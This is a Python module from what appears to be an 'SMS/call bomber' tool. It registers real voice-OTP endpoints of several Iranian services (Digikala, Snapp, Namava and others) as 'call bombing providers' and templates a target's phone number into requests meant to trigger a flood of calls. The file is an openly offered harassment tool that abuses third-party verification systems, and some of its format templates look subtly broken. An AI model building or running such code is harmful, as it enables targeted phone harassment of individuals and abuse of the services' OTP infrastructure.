# sms_bomber/api/call_providers.py
from typing import Dict, List, Any
from dataclasses import dataclass


@dataclass
class CallProvider:
    """Call provider configuration."""
    
    name: str
    url: str
    data_template: Dict[str, Any]
    method: str = "POST"  # HTTP method
    call_type: str = "voice"  # voice, callback, etc.

    def get_formatted_url(self, phone_number: str) -> str:
        """Generate the URL with phone number substituted."""
        if "{phone}" in self.url:
            return self.url.replace("{phone}", phone_number)
        return self.url

    def get_request_data(self, phone_number: str) -> Dict[str, Any]:
        """Generate request data for the call provider."""
        if isinstance(self.data_template, str):
            return {"phone": self.data_template.format(phone=phone_number)}

        data = self.data_template.copy()
        for key, value in data.items():
            if isinstance(value, str) and "{phone}" in value:
                data[key] = value.format(phone=phone_number)
            elif value == "{phone}":
                data[key] = phone_number
        return data


class CallProviderRegistry:
    """Registry of call bombing providers."""

    def __init__(self):
        self.providers: List[CallProvider] = []
        self._load_default_providers()

    def _load_default_providers(self) -> None:
        """Load call bombing providers - Voice OTP endpoints."""
        default_providers = [
            # Voice OTP Providers (these request voice call with OTP)
            CallProvider(
                name="Digikala Call",
                url="https://api.digikala.com/v1/user/authenticate/",
                data_template={"username": "{phone}", "otp_call": True},
                call_type="voice"
            ),
            CallProvider(
                name="Alibaba Call",
                url="https://ws.alibaba.ir/api/v3/account/mobile/call-otp",
                data_template={"phoneNumber": "{phone[1:]}"},
                call_type="voice"
            ),
            CallProvider(
                name="Namava Call",
                url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/call-request",
                data_template={"UserName": "+98{phone[1:]}"},
                call_type="voice"
            ),
            CallProvider(
                name="Trip.ir Call",
                url="https://gateway.trip.ir/api/Totp/call",
                data_template={"PhoneNumber": "{phone}"},
                call_type="voice"
            ),
            CallProvider(
                name="Snapp Call",
                url="https://app.snapp.taxi/api/api-passenger-oauth/v2/call-otp",
                data_template={"cellphone": "{phone}"},
                call_type="voice"
            ),
        ]
        self.providers.extend(default_providers)

    def add_provider(self, provider: CallProvider) -> None:
        """Add a new call provider."""
        self.providers.append(provider)

    def get_all_providers(self) -> List[CallProvider]:
        """Get all registered call providers."""
        return self.providers.copy()

    def get_providers_by_type(self, call_type: str) -> List[CallProvider]:
        """Get providers by call type."""
        return [p for p in self.providers if p.call_type == call_type]
